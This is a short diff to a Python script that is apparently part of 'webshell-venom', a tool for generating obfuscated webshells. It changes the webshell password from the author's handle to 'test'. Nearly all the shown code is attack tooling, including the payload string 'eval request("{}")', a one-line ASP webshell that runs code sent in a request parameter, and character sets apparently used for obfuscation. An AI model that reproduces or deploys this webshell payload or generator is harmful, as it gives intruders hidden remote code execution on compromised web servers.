@@ -3,7 +3,7 @@ import random
 #github: https://github.com/yzddmr6/webshell-venom/
 #blog: https://yzddmr6.tk/
 func='execute'
-passwd='yzddmr6'
+passwd='test'
 str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 str2='`~-=!@#$%^&*_/+?<>{}|:[]'
 payload='eval request("{}")'.format(passwd)
